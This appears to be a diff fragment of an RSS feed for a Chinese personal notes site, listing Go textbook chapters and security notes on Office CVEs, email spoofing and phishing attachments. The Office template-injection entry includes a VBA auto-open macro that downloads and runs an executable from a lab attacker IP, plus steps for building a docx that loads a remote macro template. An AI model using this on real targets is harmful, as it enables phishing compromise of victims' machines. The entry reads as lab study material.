+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406261143196.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH8.Goroutines和Channels</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH8-Goroutines%E5%92%8CChannels.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH8-Goroutines%E5%92%8CChannels.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH8.Goroutines和Channels</source>
+      <description>CH8.Goroutines和Channels
+
+CH8.Goroutines和Channels
+
+简介
+8.1.Goroutines
+8.2. 示例: 并发的Clock服务
+
+
+
+
+简介
+Go语言中的并发程序可以用两种手段来实现。Goroutine 和 Channel
+Goroutine 和 Channel 是 Go 语言并发编程的核心概念。它们提供...</description>
+      <pubDate>Mon, 24 Jun 2024 00:23:24 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#ch8goroutines%E5%92%8Cchannels">CH8.Goroutines和Channels</a>
+<ul>
+<li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li>
+<li><a href="#81goroutines">8.1.Goroutines</a></li>
+<li><a href="#82-%E7%A4%BA%E4%BE%8B-%E5%B9%B6%E5%8F%91%E7%9A%84clock%E6%9C%8D%E5%8A%A1">8.2. 示例: 并发的Clock服务</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/image-20240618105324208.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH9-基于共享变量的并发</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH9-%E5%9F%BA%E4%BA%8E%E5%85%B1%E4%BA%AB%E5%8F%98%E9%87%8F%E7%9A%84%E5%B9%B6%E5%8F%91.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH9-%E5%9F%BA%E4%BA%8E%E5%85%B1%E4%BA%AB%E5%8F%98%E9%87%8F%E7%9A%84%E5%B9%B6%E5%8F%91.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH9-基于共享变量的并发</source>
+      <description>CH9-基于共享变量的并发
+
+基于共享变量的并发 - Go语言圣经 (golang-china.github.io)
+
+前一章我们介绍了一些使用 goroutine 和 channel 这样直接而自然的方式来实现并发的方法。然而这样做我们实际上回避了在写并发代码时必须处理的一些重要而且细微的问题。
+在本章中，我们会细致地了解并发机制。尤其是在多 gor...</description>
+      <pubDate>Thu, 20 Jun 2024 10:29:01 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://golang-china.github.io/gopl-zh/ch9/ch9.html" target="_blank" rel="noopener noreferrer">基于共享变量的并发 - Go语言圣经 (golang-china.github.io)</a></p>
+</blockquote>
+<p>前一章我们介绍了一些使用 goroutine 和 channel 这样直接而自然的方式来实现并发的方法。然而这样做我们实际上回避了在写并发代码时必须处理的一些重要而且细微的问题。</p>
+<p>在本章中，我们会细致地了解并发机制。尤其是在多 goroutine 之间的共享变量，并发问题的分析手段，以及解决这些问题的基本模式。最后我们会解释 goroutine 和操作系统线程之间的技术上的一些区别。</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406211042873.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2017-11882</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-11882.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-11882.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-11882</source>
+      <description>CVE-2017-11882
+
+CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com)
+
+
+
+CVE-2017-11882
+
+简介
+复现环境
+漏洞复现
+参考材料
+
+
+
+
+简介
+潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）影响版本从 Office 2000 到当时最新的 Off...</description>
+      <pubDate>Mon, 17 Jun 2024 00:37:21 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.sqlsec.com/2020/10/office.html" target="_blank" rel="noopener noreferrer">CVE-2017-11882 Office RCE 复现 | 国光 (sqlsec.com)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406170554036.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2018-0802</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-0802.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-0802.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2018-0802</source>
+      <description>CVE-2018-0802
+简介
+在2017年11月14日，微软发布11月份安全补丁更新，其中更新了潜伏17年之久的Office远程代码执行漏洞(CVE-2017-11882) “噩梦公式一代“
+而在2018年1月，又爆出了office 0day漏洞(CVE-2018-0802),该漏洞的技术原理类似17年修补的漏洞，是由于office公式编辑器组件E...</description>
+      <pubDate>Mon, 17 Jun 2024 00:37:21 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>简介</h2>
+<p>在2017年11月14日，微软发布11月份安全补丁更新，其中更新了潜伏17年之久的Office远程代码执行漏洞(CVE-2017-11882) “噩梦公式一代“</p>
+<p>而在2018年1月，又爆出了office 0day漏洞(CVE-2018-0802),该漏洞的技术原理类似17年修补的漏洞，是由于office公式编辑器组件EQNEDT32.EXE，对字体名的长度没有进行长度检验，导致攻击者可以通过构造恶意的字体名，在当前登录用户的上下文中执行任意代码。失败的攻击尝试可能会引发 DoS攻击 ，全部版本受影响。我们将其命名为“噩梦公式二代”（CVE-2018-0802）。</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406170732208.png" type="image/png"/>
+    </item>
+    <item>
+      <title>模板</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/%E6%A8%A1%E6%9D%BF.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/%E6%A8%A1%E6%9D%BF.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">模板</source>
+      <description>模板
+
+
+模板
+
+简介
+复现环境
+漏洞复现
+参考材料
+
+
+
+
+简介
+
+复现环境
+
+
+靶机:
+
+Win7SP1旗舰版+Office2016
+IP: 192.168.5.11
+
+
+
+攻击机 Kali
+
+IP: 100.1.1.131
+
+
+
+
+漏洞复现
+
+参考材料
+
+
+分析
+
+
+利用工具
+
+
+复现过程
+
+
+检测对抗</description>
+      <pubDate>Mon, 17 Jun 2024 00:37:06 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>钓鱼邮件</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">钓鱼邮件</source>
+      <description>钓鱼邮件
+伪造伪造发件人
+
+什么是电子邮件假冒？| Cloudflare | Cloudflare (cloudflare-cn.com)
+邮件伪造原理和实践 - SAUCERMAN (saucer-man.com)
+关于伪造邮件的简单研究 (ti0s.com)
+
+在电子邮件假冒中，攻击者使用一个电子邮件头掩盖自己的身份，冒充成一个合法的发件人。（电子...</description>
+      <pubDate>Sun, 16 Jun 2024 21:20:47 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>伪造伪造发件人</h2>
+<blockquote>
+<p><a href="https://www.cloudflare-cn.com/learning/email-security/what-is-email-spoofing/" target="_blank" rel="noopener noreferrer">什么是电子邮件假冒？| Cloudflare | Cloudflare (cloudflare-cn.com)</a></p>
+<p><a href="https://saucer-man.com/information_security/452.html#cl-4" target="_blank" rel="noopener noreferrer">邮件伪造原理和实践 - SAUCERMAN (saucer-man.com)</a></p>
+<p><a href="https://www.ti0s.com/39.html" target="_blank" rel="noopener noreferrer">关于伪造邮件的简单研究 (ti0s.com)</a></p>
+</blockquote>
+<p>在<a href="https://www.cloudflare-cn.com/learning/email-security/what-is-email/" target="_blank" rel="noopener noreferrer">电子邮件</a>假冒中，攻击者使用一个电子邮件头掩盖自己的身份，冒充成一个合法的发件人。（电子邮件头是一个代码片段，其中包含有关邮件的重要细节，如发件人、收件人和跟踪数据。）</p>
+<p>攻击者使用脚本伪造电子邮件收件人可以看到的字段。这些字段位于电子邮件头中，包括“发件人”和“回复”地址。如下例子显示了这些字段在一封假冒电子邮件中的样子：</p>
+<ul>
+<li><strong>From:</strong> “Legitimate Sender” email@legitimatecompany.com</li>
+<li><strong>Reply-to:</strong> email@legitimatecompany.com</li>
+</ul>
+<p>之所以能够伪造这些字段，原因是<a href="https://www.cloudflare-cn.com/learning/email-security/what-is-smtp/" target="_blank" rel="noopener noreferrer">简单邮件传输协议（SMTP）</a>没有内建验证电子邮件地址的机制。事实上，发件人和收件人的电子邮件存在于电子邮件的两个位置：邮件头和 SMTP 信封。电子邮件头包括收件人可见的字段。然而，SMTP 信封包含用于邮件服务器用于将电子邮件发送到正确地址的信息。但这些字段不必一致，电子邮件也能成功发送。因为 SMTP 信封从不检查邮件头，而且收件人不能看到信封中的信息，因此电子邮件假冒相对容易实现。</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406170440685.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2017-0199</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-0199.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-0199.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-0199</source>
+      <description>CVE-2017-0199
+
+
+CVE-2017-0199
+
+简介
+复现环境
+漏洞复现
+参考材料
+
+
+
+
+简介
+
+Tuuu Nya&amp;apos;s blog | 一个想当黑客的艺术家 ✨ (hackersb.cn)
+
+CVE-2017-0199是首个Microsoft Office RTF漏洞，漏洞发布日期为2017年4月11日
+受影响系统包括：
+
+Microso...</description>
+      <pubDate>Sun, 16 Jun 2024 15:58:43 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406140951201.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CTF</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CTF</source>
+      <description>CTF
+Writeup
+GitHub - ctf-wiki/ctf-challenges</description>
+      <pubDate>Fri, 14 Jun 2024 10:53:35 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>Writeup</h2>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener noreferrer">GitHub - ctf-wiki/ctf-challenges</a></p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2017-8570</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8570.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8570.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-8570</source>
+      <description>CVE-2017-8570
+
+Office CVE-2017-8570 远程代码执行漏洞复现 | 国光 (sqlsec.com)
+手冢冢/Office8570：CVE20178570 --- tezukanice/Office8570: CVE20178570 (github.com)
+
+Office CVE-2017-8570漏洞复现-CSDN博客
+...</description>
+      <pubDate>Fri, 14 Jun 2024 10:52:29 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.sqlsec.com/2017/08/officecve.html#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83" target="_blank" rel="noopener noreferrer">Office CVE-2017-8570 远程代码执行漏洞复现 | 国光 (sqlsec.com)</a></p>
+<p>[手冢冢/Office8570：CVE20178570</p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406131518648.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CPL</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/CPL/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/CPL/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CPL</source>
+      <description>CPL
+
+【钓鱼从入门到放弃】-CPL文件笔记 (atsud0.me)
+CPL文件利用介绍 - 三好学生 (wooyun.js.org)</description>
+      <pubDate>Thu, 13 Jun 2024 01:57:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CPL%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-CPL文件笔记 (atsud0.me)</a></p>
+<p><a href="https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html" target="_blank" rel="noopener noreferrer">CPL文件利用介绍 - 三好学生 (wooyun.js.org)</a></p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>PDF钓鱼</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">PDF钓鱼</source>
+      <description>PDF钓鱼
+
+Check Point 警告 PDF 恶意软件激增 - CyberTalk --- Check Point warns of PDF malware surge - CyberTalk
+
+报告 Check Point 警告 PDF 恶意软件激增 - CyberTalk --- Check Point warns of PDF malwar...</description>
+      <pubDate>Thu, 06 Jun 2024 08:37:01 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p>[Check Point 警告 PDF 恶意软件激增 - CyberTalk</p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CHM</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/CHM/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/CHM/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CHM</source>
+      <description>CHM
+
+【钓鱼从入门到放弃】-CHM文件笔记 (atsud0.me)
+
+CHM攻击利用指北 - FreeBuf网络安全行业门户
+高级组合技打造“完美” 捆绑后门 | Evi1cg&amp;apos;s blog
+钓鱼攻击之：CHM电子书钓鱼 - f_carey - 博客园 (cnblogs.com)
+
+Ridter/MyJSRat: This is JSRat.ps1...</description>
+      <pubDate>Wed, 05 Jun 2024 03:06:10 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-CHM文件笔记 (atsud0.me)</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406261708859.png" type="image/png"/>
+    </item>
+    <item>
+      <title>VBA宏</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E5%AE%8F/VBA%E5%AE%8F.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E5%AE%8F/VBA%E5%AE%8F.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">VBA宏</source>
+      <description>VBA宏
+
+【钓鱼从入门到放弃】-Docx远程模版加载宏代码 (atsud0.me)
+
+
+渗透测试-地基钓鱼篇-Word文档注入执行恶意宏（二十四）_渗透测试中,office宏执行方法利用-CSDN博客
+
+
+
+VBA宏
+
+概述
+
+VBA宏的结构
+
+
+执行 JavaScript
+调用 PowerShell 使用 curl 下载与执行恶意程序
+调用 CMD...</description>
+      <pubDate>Wed, 05 Jun 2024 03:06:10 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://atsud0.me/2022/01/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-Docx%E8%BF%9C%E7%A8%8B%E6%A8%A1%E7%89%88%E5%8A%A0%E8%BD%BD%E5%AE%8F%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener noreferrer">【钓鱼从入门到放弃】-Docx远程模版加载宏代码 (atsud0.me)</a></p>
+</blockquote>
+<ul>
+<li><a href="https://blog.csdn.net/qq_34801745/article/details/111307768" target="_blank" rel="noopener noreferrer">渗透测试-地基钓鱼篇-Word文档注入执行恶意宏（二十四）_渗透测试中,office宏执行方法利用-CSDN博客</a></li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407011625102.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH7.接口</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH7-%E6%8E%A5%E5%8F%A3.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH7-%E6%8E%A5%E5%8F%A3.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH7.接口</source>
+      <description>CH7.接口
+
+
+CH7.接口
+
+CH7.6.sort.Interface接口
+CH7.7.http.Handler接口
+CH7.8.error接口
+CH7.9.示例.表达式求值
+CH7.10.类型断言
+CH7.11.基于类型断言区别错误类型
+CH7.12.通过类型断言询问行为
+CH7.13.类型分支
+CH7.14.示例.基于标记的XML解码
+CH7....</description>
+      <pubDate>Tue, 04 Jun 2024 16:58:50 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406110239140.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Office关系模板注入</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Office关系模板注入</source>
+      <description>Office关系模板注入
+
+干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)
+wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户
+已阻止有潜在危险的宏 - Microsoft 支持
+利用模板注入攻击关键基础设施 (cisco.com)
+
+
+测试环境: Win10+Office3...</description>
+      <pubDate>Tue, 04 Jun 2024 10:51:44 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://cloud.tencent.com/developer/article/1917641" target="_blank" rel="noopener noreferrer">干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p><a href="https://www.freebuf.com/articles/network/317116.html" target="_blank" rel="noopener noreferrer">wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216" target="_blank" rel="noopener noreferrer">已阻止有潜在危险的宏 - Microsoft 支持</a></p>
+<p><a href="https://www.cisco.com/c/dam/m/zh_cn/products/security/talos/template-injection.pdf" target="_blank" rel="noopener noreferrer">利用模板注入攻击关键基础设施 (cisco.com)</a></p>
+</blockquote>
+<ul>
+<li>测试环境: Win10+Office365</li>
+</ul>
+<p>利用Word文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，当目标用户点开攻击者发送的恶意Word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p>
+<p>发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程DOTM文档中编写宏病毒或者木马即可。</p>
+<p>制作一个宏钓鱼的文档挂载到 HTTP 服务器上, 例如前面的 VBA 宏调 Powershell 下载与执行文件达成反弹shell</p>
+<div class="language-vb" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Sub</span> Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">Call</span> Shell<span class="token punctuation">(</span>Environ<span class="token operator">$</span><span class="token punctuation">(</span><span class="token string">"COMSPEC"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token string">" /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe &amp;&amp; msedge.exe"</span><span class="token punctuation">,</span> vbNormalFocus<span class="token punctuation">)</span>
+
+<span class="token keyword">End</span> <span class="token keyword">Sub</span>
+
+</code></pre></div><p>选定目标 word 文档后将其后缀名改成 <code>.zip</code> 并解压</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609857.png" alt="image-20240611053738672"></p>
+<p>整体目录结构如下:</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609303.png" alt="image-20240611053804070"></p>
+<p>制作关系模板注入文档主要需要修改两个文件</p>
+<ul>
+<li>
+<p><code>\word\_rels\settings.xml.rels</code></p>
+<p>一般 <code>word/_rels</code> 文档里可能只有 <code>document.xml.rels</code> 没有  <code>settings.xml.rels</code>, 此时需要新建一个 <code>settings.xml.rels</code> 文档</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609832.png" alt="image-20240611054035175"></p>
+<p>几个关键点</p>
+<ul>
+<li>
+<p><code>Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</code></p>
+<p>最后一定要是 <code>attachedTemplate</code> 定义关系模板</p>
+</li>
+<li>
+<p><code>TargetMode</code> 要是 <code>External</code> 外部模板定义</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>\word\settings.xml</code></p>
+<p>在 <code>w:settings</code> 属性中定义外部模板</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609115.png" alt="image-20240611054105685"></p>
+</li>
+</ul>
+<p>将目录重新打包成 zip 并重命名为 docx 文档</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609548.png" alt="image-20240611055158981"></p>
+<p>到这里模板注入的钓鱼文档就制作好了, 但是由于这里外联模板直接填的ip是不受信任的, 因此这里即便打开了也不会正常加载外部模板, 需要添加受信任站点</p>
+<blockquote>
+<p><a href="https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216" target="_blank" rel="noopener noreferrer">已阻止有潜在危险的宏 - Microsoft 支持</a></p>
+</blockquote>
+<p>打开 <code>Internet选项-&gt;受信任的站点-&gt;站点</code> 添加目标主机即可</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111038830.png" alt="image-20240611103839273"></p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111039797.png" alt="image-20240611103954699"></p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111041875.png" alt="image-20240611104113796"></p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406110609857.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH6.方法</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH6-%E6%96%B9%E6%B3%95.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH6-%E6%96%B9%E6%B3%95.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH6.方法</source>
+      <description>CH6.方法
+
+
+CH6.方法
+
+CH6.1.方法声明
+CH6.2.基于指针对象的方法
+CH6.3.通过嵌入结构体来扩展类型
+CH6.4.方法值和方法表达式
+CH6.5.示例:Bit数组
+CH6.6.封装
+习题
+
+
+
+
+CH6.1.方法声明
+
+方法声明 - Go语言圣经 (golang-china.github.io)
+
+在Go语言中，方法声明是指在类...</description>
+      <pubDate>Mon, 03 Jun 2024 10:36:32 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202406040038258.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CobaltStrike</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/C2/CobaltStrike/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/C2/CobaltStrike/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CobaltStrike</source>
+      <description>CobaltStrike
+校验
+
+verify.cobaltstrike.com
+
+
+问题处理
+library initialization failed - unable to allocate file descriptor table - out of memory
+
+Recent trouble launching on Debian; res...</description>
